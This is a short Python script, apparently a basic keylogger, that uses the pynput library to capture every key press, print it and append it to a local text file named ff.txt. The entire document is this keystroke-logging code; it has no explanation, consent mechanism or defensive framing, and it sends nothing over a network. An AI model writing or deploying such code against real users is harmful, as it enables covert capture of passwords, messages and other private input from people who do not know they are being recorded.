import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    print("{0}".format(key))
    writeFile(keys)
    keys = []


def writeFile(keys):
    with open("ff.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            f.write(k)
            f.write("\n")


with Listener(on_press=on_press) as listener:
    listener.join()
